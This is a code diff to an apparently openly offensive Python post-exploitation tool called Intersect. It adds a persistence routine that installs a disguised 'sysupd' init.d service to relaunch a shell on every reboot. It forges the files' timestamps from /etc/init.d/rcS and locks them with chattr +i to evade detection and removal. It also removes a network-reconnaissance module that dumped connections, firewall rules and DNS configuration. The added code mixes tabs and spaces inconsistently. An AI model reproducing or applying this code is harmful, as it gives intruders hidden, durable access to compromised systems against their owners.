@@ -116,7 +116,7 @@ def globalvars():
     global PKEY
     global modList
 
-    modList = ['persistent', 'bshell', 'creds', 'network']
+    modList = ['persistent', 'bshell', 'creds']
     PORT = 4444
     RHOST = ''
     RPORT = 8888
@@ -124,6 +124,29 @@ def globalvars():
     PKEY = 'KXYRTUX'
 # Lets you install an Intersect shell as a persistent service on the target. You must define your shell type and file location when prompted.
 def persistent():
+	header = " => "
+	print("Select option: ")
+	print("1. Add new service")
+	print("2. Remove existing persistence")
+	option = raw_input("%s " % (header))
+
+	if option == '1':
+		addpersist()
+	elif option == '2':
+		if os.path.exists("/etc/init.d/sysupd") is True:
+			print("[+] Removing Intersect persistence...")
+			if whereis('chattr') is not None:
+				os.system("chattr -i /etc/init.d/sysupd")
+				os.system("chattr -i /etc/default/sysupd")
+			os.system("rm /etc/init.d/sysupd")
+			os.system("update-rc.d sysupd remove")
+			os.system("rm /etc/default/sysupd")
+			print("[+] Persistent shell successfully removed!")
+	else:
+		print("[!] Invalid option! Enter '1' or '2'")
+
+	
+def addpersist():
 	header = " => "
 	print("Full path of your Intersect script: ")
 	currentfile = raw_input("%s " % (header))
@@ -144,17 +167,26 @@ def persistent():
 	else:
 		if os.path.isdir("/etc/init.d"):
 			serwrite = open("/etc/init.d/sysupd", "w")
-			serwrite.write("#!/bin/sh\ncd /etc/default/\nsudo python sysupd --%s &" % shell)
+			serwrite.write("#!/bin/sh\ncd /etc/default/\npython sysupd --%s &" % shell)
 			serwrite.close()
 			os.system("chmod +x /etc/init.d/sysupd")
 			os.system("update-rc.d sysupd defaults")
 			print("[+] Persistent service installed.")
-			print("[+] Modifying touch times on shell files...")
-			os.system("touch -t 200512311216 /etc/default/sysupd")
-			os.system("touch -t 200512311216 /etc/init.d/sysupd")
-			print("[+] Locking down shell files with chattr +i...")
-			os.system("chattr +i /etc/default/sysupd")
-			os.system("chattr +i /etc/init.d/sysupd")
+			print("[+] Modifying accessed and modified times on shell files...")
+            		copystat = os.stat('/etc/init.d/rcS')
+			os.utime("/etc/default/sysupd",(copystat.st_atime, copystat.st_mtime))
+			os.utime("/etc/init.d/sysupd",(copystat.st_atime, copystat.st_mtime))
+			print("[+] Attempting to lock down shell files...")
+			if whereis('chattr') is not None:
+				status = os.system("chattr +i /etc/default/sysupd")
+                		if status & 0xff00:
+					print("[!] Chattr exited with non-zero status. Could not lock files.")
+				status = os.system("chattr +i /etc/init.d/sysupd")
+                		if status & 0xff00:
+                		    print("[!] Chattr exited with non-zero status. Could not lock files.")
+			else:
+                		print("[!] Chattr not found. Could not lock files.")
+
 			print("[+] Persistent shell successfull! System will now start your shell as a background process on every reboot.")
 
 
@@ -331,73 +363,6 @@ def creds():
             
 
 
-# Finds and saves network information such as listening ports, firewall rules, DNS configurations, network interfaces and active connections.
-def network():
-    print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
-    os.mkdir(Temp_Dir+"/network")
-    networkdir = (Temp_Dir+"/network")
-    os.chdir(networkdir) 
-
-    proc = Popen('netstat --tcp --listening',
-         shell=True,
-         stdout=PIPE,
-         )
-    output = proc.communicate()[0]
-
-    file = open("nstat.txt","a")
-    for items in output:
-        file.write(items),
-    file.close() 
-
-    os.system("lsof -nPi > lsof.txt")
-    ports = ["nstat.txt","lsof.txt"]
-    content = ''
-    for f in ports:
-        content = content + '\n' + open(f).read()
-    open('Connections.txt','wb').write(content)
-    os.system("rm nstat.txt lsof.txt")
-    if whereis('iptables') is not None:
-        os.system("iptables -L -n > iptablesLN.txt") 
-        os.system("iptables-save > iptables_save.txt")
-    else:
-        pass
-
-    os.system("ifconfig -a > ifconfig.txt")
-
-
-    if distro == "ubuntu" or distro2 == "Ubuntu" is True:
-        os.system("hostname -I > IPAddresses.txt")
-    else:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("google.com",80))
-        localIP = (s.getsockname()[0])
-        s.close()
-        splitIP = localIP.split('.')
-        splitIP[3:] = (['0/24'])
-        IPRange = ".".join(splitIP)
-        externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
-        file = open("IPAddresses.txt", "a")
-        file.write("External IP Address: " + externalIP)
-        file.write("Internal IP Address: " + localIP)
-        file.write("Internal IP Range: " + IPRange)
-        file.close
-   
-    os.system("hostname -f > hostname.txt")
-   
-    netfiles = ["IPAddresses.txt","hostname.txt","ifconfig.txt"]
-    content = ''
-    for f in netfiles:
-        content = content + '\n' + open(f).read()
-    open('NetworkInfo.txt','wb').write(content)
-    os.system("rm IPAddresses.txt hostname.txt ifconfig.txt")
-
-    network = [ "/etc/hosts.deny", "/etc/hosts.allow", "/etc/inetd.conf", "/etc/host.conf", "/etc/resolv.conf" ]
-    for x in network:
-        if os.path.exists(x) is True:
-            shutil.copy2(x, networkdir)
-   
-
-
 
 def usage():
     print('============================================')
@@ -407,11 +372,10 @@ def usage():
     print('     -p   --persistent')
     print('     -b   --bshell')
     print('     -c   --creds')
-    print('     -n   --network')
 
 def main(argv):
     try:
-        opts, args = getopt.getopt(sys.argv[1:], 'pbcn', ['persistent', 'bshell', 'creds', 'network', 'help'])
+        opts, args = getopt.getopt(sys.argv[1:], 'pbc', ['persistent', 'bshell', 'creds', 'help'])
     except getopt.GetoptError, err:
         print str(err)
         Shutdown()
@@ -426,8 +390,6 @@ def main(argv):
             bshell()
         elif o in ('-c', '--creds'):
             creds()
-        elif o in ('-n', '--network'):
-            network()
         else:
             assert False, 'unhandled option'
     Shutdown()
